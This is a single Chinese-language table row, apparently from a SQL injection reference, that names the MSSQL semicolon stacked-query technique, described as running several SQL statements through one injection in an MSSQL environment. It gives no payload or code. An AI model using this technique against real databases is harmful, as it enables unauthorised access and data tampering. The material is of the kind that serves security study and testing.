| MSSQL 分号多语句 | 一次注入执行多条 SQL | MSSQL 环境 |
